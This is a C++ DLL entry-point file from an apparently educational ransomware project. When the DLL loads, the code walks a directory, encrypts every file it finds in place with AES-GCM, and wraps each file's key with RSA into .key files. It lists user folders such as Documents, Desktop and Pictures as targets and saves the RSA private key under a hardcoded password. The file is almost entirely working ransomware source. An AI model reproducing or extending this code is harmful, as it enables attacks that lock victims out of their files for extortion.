// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

#include <cstdlib>
#include <iostream>
#include <vector>
#include <set>
#include <tuple>
#include <fstream>
#include <iostream>

#include <windows.h>

#include <openssl\bio.h>
#include <openssl\pem.h>

#include "..\..\RansomwareExample\RansomwareExample\AESCrypto.h"
#include "..\..\RansomwareExample\RansomwareExample\RSACrypto.h"

#include <boost\filesystem.hpp>

using namespace std;
using namespace boost::filesystem;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: {
		set<wstring> wanted_folders = set<wstring>();
		wanted_folders.insert(L"Documents");
		wanted_folders.insert(L"Desktop");
		wanted_folders.insert(L"Documents");
		wanted_folders.insert(L"Pictures");
		wanted_folders.insert(L"Videos");
		wanted_folders.insert(L"Downloads");

		printf("Gathering file paths\n");

		vector<wstring> file_paths = vector<wstring>();

		// Test
		wstring drive = wstring(L"C:\\Users\\irslambouf\\Desktop\\test");

		recursive_directory_iterator dir(drive), end;
		while (dir != end) {
			try
			{
				if (is_regular_file(dir->path())) {
					wprintf(L"-%s\n", &(dir->path().wstring())[0]);
					file_paths.push_back(dir->path().wstring());
				}

				++dir;
			}
			catch (const filesystem_error& ex)
			{
				printf("PROBLEM PATH - %s\n", dir->path());
				printf("%s\n", ex.what());
			}
		}
		printf("Generating RSA key\n");
		RSACrypto rsa = RSACrypto();

		printf("Generating AES key\n");
		AESCrypto aes = AESCrypto();

		for (wstring path_str : file_paths) {
			unsigned char * aes_key_and_tag = new unsigned char[32 + 16]();
			aes.get_aes_key(aes_key_and_tag);

			if (aes.in_place_encrypt(path_str, aes_key_and_tag + 32) > 0) { // Fill last 16 bytes with gcm tag
				wprintf(L"Successfully encrypted - %s\n", &(path_str)[0]);
			}
			else {
				wprintf(L"Failed encryption - %s\n", &(path_str)[0]);
			}

			wstring key_path = path_str + L".key";
			wprintf(L"Encrypting key for %s\n", &path_str[0]);
			rsa.encrypt_key(key_path, aes_key_and_tag, 32 + 16);
		}

		

		printf("Saving RSA key\n");
		/* Save encrypted RSA private key */
		BIO *out = BIO_new_file("C:\\Users\\irslambouf\\priv.key", "w");
		EVP_PKEY *priv_key = EVP_PKEY_new();
		EVP_PKEY_set1_RSA(priv_key, rsa.get_rsa());
		if (!PEM_write_bio_PKCS8PrivateKey(out, priv_key, EVP_aes_256_cbc(), NULL, NULL, NULL, "SuP3RS3Cr3tPa$$w0Rd")) {
			printf("Failed to write private key, exiting...");
		}
		else {
			printf("Successfully encrypted RSA key... exiting");
		}
		/* Clean up memory */
		EVP_PKEY_free(priv_key);
		BIO_free_all(out);
		rsa.free_all();
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
